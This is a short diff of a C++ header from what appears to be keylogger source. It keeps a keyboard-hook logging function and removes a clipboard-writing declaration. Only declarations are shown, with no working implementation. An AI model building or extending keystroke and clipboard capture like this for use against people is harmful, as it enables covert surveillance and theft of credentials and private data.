@@ -6,6 +6,4 @@
 namespace keylogger
 {
     void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);
-
-    void write_clipboard_data(std::wofstream& stream);
 };
